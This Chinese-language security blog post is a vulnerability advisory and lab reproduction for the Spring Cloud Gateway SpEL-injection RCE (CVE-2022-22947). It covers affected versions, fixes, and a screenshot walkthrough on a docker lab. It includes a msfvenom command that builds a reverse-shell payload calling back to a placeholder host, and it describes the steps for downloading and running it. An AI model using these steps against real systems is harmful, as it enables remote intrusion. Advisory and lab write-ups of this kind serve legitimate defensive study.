#  [A9 Team] Spring Cloud Gateway RCE漏洞预警和复现

原创 9ouu  [ A9 Team ](javascript:void\(0\);)

**A9 Team** ![]()

微信号 gh_533347fad180

功能介绍 A9 Team
是一个虚拟安全团队，成员来自安信、青藤、观星、梆梆、微步、安全狗等公司。成员能力涉及安全建设、安全运营、安全攻防等领域，致力于持续分享信息安全工作中的思考和实践，期望和朋友们共同进步，守望相助，合作共赢。

____

__

收录于话题

#漏洞复现 1 个

#Spring Cloud Gateway 1 个

#spring 1 个

#命令执行 1 个

**1 、漏洞描述**

 **  
**

 **Spring Cloud Gateway 是Spring Cloud
生态系统中的网关，基于Spring生态系统之上构建的API网关，包括：Spring 5，Spring Boot 2和Project
Reactor。Spring Cloud Gateway旨在为微服务架构提供一种简单、有效、统一的API路由管理方式。**

 **据公告描述，当启用、暴露和不安全的 Gateway Actuator 端点时，使用 Spring Cloud Gateway
的应用程序容易受到代码注入攻击。远程攻击者可以发出恶意制作的请求，允许在远程主机上进行任意远程执行**  
  
---  
  
  

 **2 、风险等级**

 **  
**

 **高。攻击者可利用该漏洞远程执行任意代码。已发现漏洞利用被公开，危害较大**  
---  
  
 ** **  

 **3 、影响版本**

 **  
**

 **Spring Cloud Gateway < 3.1.1**

 **Spring Cloud Gateway < 3.0.7**

 **Spring Cloud Gateway  其他已不再更新的版本**  
  
---  
  
  

 **4 、安全版本**

 **  
**

 **       Spring Cloud Gateway >= 3.1.1**

 **        Spring Cloud Gateway >= 3.0.7**  
  
---  
  
 ** **

 **5 、修复建议**

 **       **

 **  安全版本：**

 **        官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，升级至安全版本。**

 **  缓解方法：**

 **       1、受影响版本的用户可以通过以下措施补救。**

 **             3.1.x用户应升级到3.1.1+**

 **             3.0.x用户应升级到3.0.7+**

 **
2、如果不需要Actuator端点，可以通过management.endpoint.gateway.enable：false配置将其禁用**

 **       3、如果需要Actuator端点，则应使用Spring Security对其进行保护**

  

 **已修复此问题的版本包括：**

 **        Spring Cloud Gateway**

 **             3.1.1+**

 **             3.0.7+**  
  
---  
  
  

 ** **

 **6 、漏洞复现**

 **       **

**本来打算在公司测试环境进行复现的，然后翻了一下github，有docker！那我就直接脱下来复现好了。由于某些大家都懂的原因，就不直接显示payload了。**  
---  
  
  

![](https://gitee.com/fuli009/images/raw/master/public/20220303143655.png)

  

 **打开后界面是这样的**  
---  
  
  

![](https://gitee.com/fuli009/images/raw/master/public/20220303143707.png)

  

 **接下来开始复现吧，先做好直接上线的准备。因为环境是linux，所以用下面的命令生成个码子，记好下面的payload，下面要用到。**  
---  
  
  

  * 

    
    
     msfvenom -p linux/x86/shell_reverse_tcp LHOST=x.x.x.x LPORT=9911 -f elf >reverse.elf

  

 **然后用python启个服务把码子挂在上面，对，就像下面操作那样**  
---  
  
  

![](https://gitee.com/fuli009/images/raw/master/public/20220303143708.png)

  

 **然后配置好msf，payload就设置你生成木马的那个payload，大家应该都会，我就为了多贴个图哈哈哈哈，记得配置好监听起来。**  
---  
  
  

![](https://gitee.com/fuli009/images/raw/master/public/20220303143709.png)

![](https://gitee.com/fuli009/images/raw/master/public/20220303143711.png)

  

 **然后发送如下数据包就可以添加一个包含恶意SpEL表达式的路由，这里我让payload去下载我的码子，还有一个点，我new
string去掉了，不然执行不起来，payload我就不贴了大家可以看参考链接。**  
---  
  
  

![](https://gitee.com/fuli009/images/raw/master/public/20220303143713.png)

  

 **跟以前的漏洞一样，这里需要刷新去触发，也可以说是去应用刚添加的路由，这个数据包会触发SpEL表达式的执行。**  
---  
  
  

![](https://gitee.com/fuli009/images/raw/master/public/20220303143715.png)

  

 **发送下面数据包即可查看执行结果，我这里是下载文件的命令所以没有显示出来，这里显示的是我上一次执行命令的结果。**  
---  
  
  

![](https://gitee.com/fuli009/images/raw/master/public/20220303143717.png)

 **最后这个数据包可以删除所添加的路由。**  
---  
  
  

![](https://gitee.com/fuli009/images/raw/master/public/20220303143719.png)

  

 **当我们执行第二个payloda的时候就可以看到客户端来下载我们的码子。**  
---  
  
  

![](https://gitee.com/fuli009/images/raw/master/public/20220303143720.png)

  

 **进docker确认一下，是执行成功的。**  
---  
  
  

![](https://gitee.com/fuli009/images/raw/master/public/20220303143721.png)

  

 **只下载也没用啊，我们要运行起来，执行下面payload运行木马文件，这里我想 &&连起来，尝试了几次不行就分开执行了。**  
---  
  
  

![](https://gitee.com/fuli009/images/raw/master/public/20220303143722.png)

  

 **回到msf，靶机已经上线，命令执行成功** 。  
---  
  
  

![](https://gitee.com/fuli009/images/raw/master/public/20220303143724.png)

  

 **如果要简单点之间反弹shell也可以，不过需要把命令base64编码。**  
---  
  
  

![](https://gitee.com/fuli009/images/raw/master/public/20220303143726.png)

 **7 、参考链接**  

  

 **修复：**

 **[1]https://docs.spring.io/spring-
boot/docs/current/reference/html/actuator.html#actuator.endpoints.security。**

 **[2]https://github.com/spring-cloud/spring-cloud-gateway**

 ** **

 **复现**

 **[1]https://wya.pl/2022/02/26/cve-2022-22947-spel-casting-and-evil-beans/**

**[2]https://github.com/vulhub/vulhub/blob/master/spring/CVE-2022-22947/README.zh-
cn.md**  
  
---  
  
  

 **8 、最后**

 ****

![](https://gitee.com/fuli009/images/raw/master/public/20220303143729.png)

  

预览时标签不可点

收录于话题 #

 个

上一篇 下一篇

阅读

分享 收藏

赞 在看

____已同步到看一看[写下你的想法](javascript:;)

前往“发现”-“看一看”浏览“朋友在看”

![示意图](//res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_like_comment55871f.png)

前往看一看

**看一看入口已关闭**

在“设置”-“通用”-“发现页管理”打开“看一看”入口

[我知道了](javascript:;)

__

已发送

取消 __

####  发送到看一看

发送

[A9 Team] Spring Cloud Gateway RCE漏洞预警和复现

最多200字，当前共字

__

发送中

[写留言](javascript:;)

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。 视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

